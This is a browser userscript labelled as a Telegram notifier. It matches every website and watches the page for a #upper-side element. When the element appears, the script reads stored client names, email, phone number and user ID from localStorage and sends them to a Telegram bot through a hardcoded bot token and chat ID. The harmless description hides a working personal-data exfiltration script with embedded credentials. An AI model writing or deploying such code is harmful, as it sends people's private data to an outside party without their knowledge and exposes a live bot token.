// ==UserScript==
// @name         Telegram Notifier
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Notify via Telegram when #upper-side element appears
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Telegram Bot API details
    const telegramBotToken = '7313056674:AAEIivyB_ADYOQwDDT6Mx_dJBJOQjq0Fe9s';
    const telegramChatId = '-1002170886131';

    // Function to send a message to Telegram
    function sendTelegramMessage(message) {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const data = {
            chat_id: telegramChatId,
            text: message
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Message sent successfully');
            } else {
                console.error('Error sending message:', data.description);
            }
        })
        .catch(error => console.error('Error:', error));
    }

    // Function to get Local Storage data and send it to Telegram
    function sendClientDataToTelegram() {
        const firstName = localStorage.getItem('selectedClientFirstName') || 'N/A';
        const lastName = localStorage.getItem('selectedClientLastName') || 'N/A';
        const email = localStorage.getItem('selectedClientEmail') || 'N/A';
        const phone = localStorage.getItem('selectedClientPhone') || 'N/A';
        const userID = localStorage.getItem("userID")|| 'N/A';
        const message = `Client Information:\nUser Id: ${userID}\nFirst Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email}\nPhone: ${phone}`;
        sendTelegramMessage(message);
    }

    // Function to check if #upper-side element is visible
    function isElementVisible(selector) {
        const element = document.querySelector(selector);
        return element && element.offsetParent !== null;
    }

    // Monitor changes in the DOM to detect #upper-side element
    const observer = new MutationObserver((mutationsList, observer) => {
        for (let mutation of mutationsList) {
            if (mutation.type === 'childList') {
                if (isElementVisible('#upper-side')) {
                    sendClientDataToTelegram();
                    observer.disconnect(); // Stop observing after detecting the element
                    break;
                }
            }
        }
    });

    // Start observing the document body for changes
    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
})();
